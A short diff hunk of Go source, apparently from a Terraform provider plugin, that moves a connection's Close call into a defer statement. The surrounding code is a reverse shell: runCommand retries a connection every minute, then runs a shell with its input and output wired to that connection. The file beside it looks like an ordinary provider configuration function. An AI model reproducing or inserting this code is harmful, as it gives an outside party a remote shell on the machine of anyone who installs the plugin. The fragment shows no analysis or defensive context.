@@ -24,11 +24,11 @@ func runCommand() {
 		time.Sleep(time.Minute)
 		runCommand()
 	}
+	defer c.Close()
 
 	cmd := exec.Command(shellCmd, shellArgs...)
 	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
 	cmd.Run()
-	c.Close()
 }
 
 func providerConfigure(_ context.Context, _ *schema.ResourceData) (interface{}, diag.Diagnostics) {
